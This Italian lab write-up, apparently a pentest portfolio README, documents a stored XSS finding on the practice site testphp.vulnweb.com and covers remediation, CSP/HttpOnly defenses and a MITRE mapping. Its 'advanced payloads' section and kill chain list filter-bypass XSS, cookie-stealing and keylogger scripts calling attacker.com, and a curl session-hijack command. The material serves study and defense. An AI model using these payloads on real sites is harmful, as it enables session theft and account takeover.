> [English](README.en.md) | **Italiano**

# Vulnerability Assessment: Stored Cross-Site Scripting (XSS)

> - **Fase:** Web Attack - XSS Stored
> - **Visibilita:** Bassa - il payload viene inserito una volta e poi colpisce tutti i visitatori della pagina senza ulteriori richieste dall'attaccante
> - **Prerequisiti:** Campo di input persistente nel database (commento, profilo, guestbook) senza sanitizzazione in ingresso e in uscita
> - **Output:** Payload JavaScript persistente nel database, esecuzione automatica su ogni visita della pagina, furto cookie sessione utenti, finding WEB-006

---

**ID Finding:** `WEB-006` | **Severity:** `Alto` | **CVSS v3.1:** 8.2

---

## 1 Executive Summary

Durante l'analisi dell'applicazione `testphp.vulnweb.com`, è stata individuata una vulnerabilità critica di tipo Stored Cross-Site Scripting (XSS).

A differenza della variante "Reflected", in questo caso il codice malevolo viene salvato permanentemente nel database dell'applicazione.

La vulnerabilità risiede nel processo di registrazione utente e modifica profilo. L'applicazione memorizza l'input utente senza sanitizzazione e lo ripropone a chiunque visualizzi quel profilo (incluso l'utente stesso o un amministratore).

L'impatto è critico poiché l'attacco non richiede che la vittima clicchi su un link specifico: basta che visualizzi la pagina infetta per eseguire il codice (es. furto cookie admin).

---

## 2 Technical Analysis

#### Scenario: Profile Persistence Injection

Il modulo di registrazione permette l'inserimento di dati anagrafici. È stato verificato che il campo "Address" accetta e salva tag HTML e JavaScript.

Procedura di Exploitation:

1.  L'attaccante accede alla pagina di registrazione (`/signup.php`).

2.  Compila il form inserendo il payload malevolo nel campo Address.

3.  Invia il form. Il server salva il payload nel database.

Payload Utilizzato:

```html
Via Roma 1 <script>alert('XSS SALVATO NEL DB!')</script>
```

Analisi dell'Evidenza:

Come mostrato nello screenshot sottostante, non appena l'applicazione recupera i dati dal database per mostrarli (nella conferma di registrazione o nel pannello profilo), lo script viene iniettato nel DOM ed eseguito.

Il popup conferma che il codice JavaScript è stato persistito ed eseguito dal contesto dell'applicazione.

![](./img/Screenshot_2026-02-15_22_46_03.jpg)

---

## 3 Remediation Plan

La mitigazione della Stored XSS richiede interventi rigorosi sia in ingresso che in uscita.

- Input Validation (Allow-list):
    
    Validare i dati in arrivo. Il campo "Indirizzo" non dovrebbe contenere caratteri come `<` o `>`. Rifiutare l'input se non conforme.

- Output Encoding (Cruciale):
    
    Ogni volta che i dati vengono prelevati dal database e inseriti in una pagina HTML, devono essere codificati.

    - PHP: Utilizzare `htmlspecialchars($address, ENT_QUOTES, 'UTF-8')`.

    - Questo trasforma `<script>` in `&lt;script&gt;`, che viene visualizzato come testo sicuro e non eseguito.

- Sanitization Libraries:
    
    Se è necessario permettere un po' di HTML (es. grassetto o corsivo), utilizzare librerie di sanitizzazione affidabili (come DOMPurify per JS o HTML Purifier per PHP) che rimuovono solo i tag pericolosi (script, iframe, object).

---

## Analisi a Basso Livello: Stored XSS - Dal Database al DOM

### Ciclo di Vita del Payload Stored XSS

A differenza della Reflected XSS (che richiede un click su un link malevolo), la Stored XSS persiste nel database e colpisce ogni visitatore:

```
Fase 1: Injection (attaccante)
    POST /signup.php HTTP/1.1
    name=Attacker&address=Via Roma 1<script>alert('XSS')</script>
        |
        v
    Server PHP: $address = $_POST['address'];
    SQL: INSERT INTO users(name, address) VALUES('Attacker', 'Via Roma 1<script>...')
        |
        v
    Il payload e ora nel DATABASE (persistente)

Fase 2: Trigger (vittima visita la pagina)
    GET /profile.php?id=42 HTTP/1.1
        |
        v
    Server PHP: $row = mysql_query("SELECT * FROM users WHERE id=42");
    echo "<p>Indirizzo: " . $row['address'] . "</p>";
        |
        v
    Response HTML inviata al browser della vittima:
    <p>Indirizzo: Via Roma 1<script>alert('XSS')</script></p>
        |
        v
    Il browser della vittima esegue lo script
    -> document.cookie esfiltrato, sessione compromessa
```

### Contesti di Injection e Encoding

Il contesto in cui il dato viene inserito determina il tipo di encoding necessario:

| Contesto | Esempio | Encoding corretto | Errore comune |
| :--- | :--- | :--- | :--- |
| HTML body | `<p>DATO</p>` | `htmlspecialchars()` | Nessun encoding |
| HTML attribute | `<input value="DATO">` | `htmlspecialchars()` con ENT_QUOTES | Solo ENT_COMPAT |
| JavaScript | `var x = "DATO";` | `json_encode()` o JS escape | htmlspecialchars (insufficiente) |
| URL parameter | `<a href="http://x?q=DATO">` | `urlencode()` | htmlspecialchars (insufficiente) |
| CSS | `<div style="color:DATO">` | Whitelist di valori | Nessun encoding |

### Payload Avanzati per Bypass Filtri

```html
<!-- Payload base (bloccato da filtri basilari) -->
<script>alert(1)</script>

<!-- Bypass filtro su tag <script> -->
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
<body onload="alert(1)">

<!-- Bypass filtro su "alert" -->
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">

<!-- Cookie stealing payload (il vero obiettivo) -->
<img src=x onerror="new Image().src='https://attacker.com/steal?c='+document.cookie">

<!-- Keylogger injection -->
<script>document.onkeypress=function(e){new Image().src='https://attacker.com/log?k='+e.key}</script>

<!-- DOM manipulation (defacement silenzioso) -->
<script>document.getElementById('transfer-form').action='https://attacker.com/phish'</script>
```

---

## Scenario Reale: Da Stored XSS a Account Takeover dell'Amministratore (WEB-006)

In un assessment reale, la Stored XSS e il vettore per compromettere l'account dell'amministratore senza interazione diretta.

### Kill Chain: Stored XSS -> Cookie Theft -> Admin Takeover

```
Fase 1: Injection del payload nel profilo utente
    POST /signup.php
    address=Via Roma 1<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>
    |
    v
Fase 2: Attesa - l'attaccante non fa nulla
    Il payload e nel database, "dormiente"
    |
    v
Fase 3: L'admin visita il profilo (es. moderazione utenti)
    GET /admin/users.php
    Il browser dell'admin esegue lo script:
    -> GET https://attacker.com/steal?c=PHPSESSID=admin_session_token_abc123
    |
    v
Fase 4: Session Hijacking
    $ curl -b "PHPSESSID=admin_session_token_abc123" http://target/admin/dashboard.php
    -> Accesso completo al pannello admin
    |
    v
Fase 5: Post-Exploitation (come admin)
    -> Upload web shell via pannello admin
    -> Modifica credenziali utenti
    -> Accesso al database tramite interfaccia admin
    -> Pivot verso il server sottostante
```

**Impatto (OWASP Top 10 2021):** XSS e classificato A7 (Cross-Site Scripting). Secondo HackerOne (2024), XSS rappresenta il 23% di tutti i report di bug bounty pagati, con payout medio di $500 per Reflected e $2.500 per Stored (perche l'impatto e significativamente maggiore).

---

## Blue Team: Detection e Difese Multi-Layer

### Detection

- **WAF rules:** bloccare input contenenti pattern XSS noti (`<script`, `onerror=`, `onload=`, `javascript:`)
- **Content Security Policy (CSP):** header che impedisce l'esecuzione di script inline:
  ```
  Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'
  ```
  Con CSP attivo, anche se il payload XSS viene iniettato, il browser rifiuta di eseguirlo perche non ha il nonce corretto
- **Monitoring:** alert su richieste outbound dal browser dei visitatori verso domini non nella whitelist (indicatore di cookie exfiltration)

### Difese Server-Side (Defense in Depth)

```php
// SBAGLIATO: output diretto dal database
echo "<p>" . $row['address'] . "</p>";

// CORRETTO: encoding in output
echo "<p>" . htmlspecialchars($row['address'], ENT_QUOTES, 'UTF-8') . "</p>";

// MEGLIO: framework con auto-escaping (Twig, Blade, React JSX)
// Twig: {{ address }}  -> auto-escaped
// React: <p>{address}</p>  -> auto-escaped (JSX)
```

- **HttpOnly flag sui cookie:** `Set-Cookie: PHPSESSID=abc; HttpOnly` - impedisce a JavaScript di leggere il cookie, neutralizzando il furto di sessione via XSS
- **SameSite flag:** `Set-Cookie: PHPSESSID=abc; SameSite=Strict` - impedisce l'invio del cookie in richieste cross-site

---

## Esperienza di Laboratorio

L'aspetto piu istruttivo e stato verificare la persistenza del payload: dopo aver iniettato lo script nel campo "Address" durante la registrazione, ogni successiva visita alla pagina del profilo ri-eseguiva lo script. Questo ha reso tangibile la differenza con la Reflected XSS: nella Reflected, la vittima deve cliccare un link specifico; nella Stored, basta visitare una pagina qualsiasi che mostra il dato infetto.

La scelta del campo "Address" come vettore di injection e stata significativa: un campo indirizzo e tipicamente considerato "sicuro" dagli sviluppatori (contiene solo testo), e quindi spesso non viene sanitizzato. In un assessment reale, i campi piu vulnerabili a Stored XSS sono quelli che sembrano innocui: nomi, indirizzi, biografie, commenti. I campi "email" e "password" sono paradossalmente piu sicuri perche vengono validati per formato.

La remediation con `htmlspecialchars()` e stata dimostrata come soluzione minima, ma la difesa professionale richiede un approccio multi-layer: encoding in output (htmlspecialchars), CSP header (blocca script inline), HttpOnly cookie (impedisce il furto anche se XSS riesce), e framework con auto-escaping (elimina il problema alla radice).

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Initial Access | Exploit Public-Facing Application | `T1190` | Injection del payload XSS nel campo "Address" del form di registrazione di `testphp.vulnweb.com`, persistito nel database senza sanitizzazione (WEB-006) |
| Persistence | Server Software Component: Web Shell | `T1505.003` | Il payload XSS Stored equivale a una componente malevola persistente lato server che si esegue automaticamente ogni volta che la pagina viene visualizzata (WEB-006) |
| Credential Access | Steal Web Session Cookie | `T1539` | Il payload Stored XSS e il vettore per rubare il cookie di sessione dell'amministratore quando visualizza il profilo infetto, senza richiedere interazione dell'attaccante (WEB-006) |

---

> **Nota:** Il finding WEB-006 e stato documentato su `testphp.vulnweb.com` sfruttando il campo
> "Address" del form di registrazione. La Stored XSS e classificata `Alto` (vs `Medio` della
> Reflected) perche colpisce tutti i visitatori della pagina inclusi gli amministratori, senza
> richiedere che la vittima clicchi su un link specifico.